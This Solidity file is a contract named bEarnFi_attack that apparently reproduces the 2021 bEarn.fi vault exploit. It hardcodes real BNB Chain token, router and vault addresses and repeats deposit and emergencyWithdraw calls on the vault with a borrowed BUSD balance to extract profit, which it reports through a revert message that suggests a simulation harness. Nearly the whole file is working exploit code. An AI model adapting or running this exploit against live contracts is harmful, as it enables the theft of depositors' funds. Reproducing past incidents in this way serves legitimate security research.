// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.7.0;
pragma experimental ABIEncoderV2;
import "./interface.sol";
//Timestamp  2021-05-16 10:36:20(UTC)
//Block number 7457125
//Gas limit  23316833
//Gas used  14297158
//tx: 0x603b2bbe2a7d0877b22531735ff686a7caad866f6c0435c37b7b49e4bfd9a36c
 

contract bEarnFi_attack {
    address private EOA;
    address private crBUSDAddress = 0x2Bc4eb013DDee29D37920938B96d353171289B7C;
    address private BUSDAddress = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address private PancakeRouterAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address private WBNBAddress = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address private ProxyAddress = 0xB390B07fcF76678089cb12d8E615d5Fe494b01Fb;
    address private FairlaunchAddress = 0xA625AB01B08ce023B2a342Dbb12a16f2C8489A8F;
    address private ibBUSDAddress = 0x7C9e73d4C71dae564d41F78d56439bB4ba87592f;
    address private BvaultsStrategyAddress = 0x21125d94Cfe886e7179c8D2fE8c1EA8D57C73E0e;
    IBvaultsStrategy BvaultsStrategy = IBvaultsStrategy(BvaultsStrategyAddress);


    IBEP20 BUSD = IBEP20(BUSDAddress);

    IBvaultsbank Bvaultsbank = IBvaultsbank(ProxyAddress);

    IBEP20 ibBUSD = IBEP20(ibBUSDAddress);

    IFairlaunch Fairlaunch = IFairlaunch(FairlaunchAddress);

    string str1 = "";
    string str2 = "";
    string str3 = "";


    constructor() payable {
        BUSD.approve(ProxyAddress, 2**256 - 1);
        EOA = msg.sender;
    }

    receive() external payable {}


    // loan amount = 7,804,239,111,784,605,253,208,534 BUSD
    function attack(uint aa, uint bb ) public {

        // ------------------Now we have enough BUSD------------------------------------------------------------------
        
        // Action 1 Deposit&Withdraw: BUSD -> BUSD    State: BUSD.balanceOf(BvaultsStrategyAddress)
        //                            State:  BUSD.balanceOf(BvaultsStrategyAddress)
        str1 = BvaultsStrategySummary(); // BvaultStrategy BUSD balance: 0
        uint balance = BUSD.balanceOf(address(this));
        uint BUSDInOnce = aa * 10 ** 4 * 10 ** 18; // (aa <= 780)
        Bvaultsbank.deposit(13, BUSDInOnce);
        Bvaultsbank.emergencyWithdraw(13);
        balance = balance - BUSD.balanceOf(address(this)); // -1



        uint BUSDIn = bb * 10 ** 4 * 10 ** 18;  // (bb <= 780)
        balance = BUSD.balanceOf(address(this));
        str2 = BvaultsStrategySummary(); // BvaultStrategy BUSD balance: 212374503292306665893940
        Bvaultsbank.deposit(13, BUSDIn);
        Bvaultsbank.emergencyWithdraw(13);
        str3 = BvaultsStrategySummary(); // BvaultStrategy BUSD balance: 212752170824477025714560
        uint BUSD_profit = BUSD.balanceOf(address(this)) - balance; 


        // 13807 146318231117041342

        revert(ProfitSummary());
    }

    function ProfitSummary() internal returns (string memory _uintAsString) {
        uint balance = BUSD.balanceOf(address(this));
        return append("BUSD profit: ", uint2str(balance - 7800000 * 10 ** 18));
    }

    function BvaultsStrategySummary() internal returns (string memory _uintAsString) {
        uint balance = BUSD.balanceOf(BvaultsStrategyAddress);
        return append("BvaultStrategy BUSD balance: ", uint2str(balance));
    }

    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
            bstr[k--] = byte(uint8(48 + _i % 10));
            _i /= 10;
        }
        return string(bstr);
    }

    function append(string memory a, string memory b) internal pure returns (string memory) {
        return string(abi.encodePacked(a, b));
    }

    function appendWithSpace(string memory a, string memory b) internal pure returns (string memory) {
        return append(a, append(" ", b));
    }     

}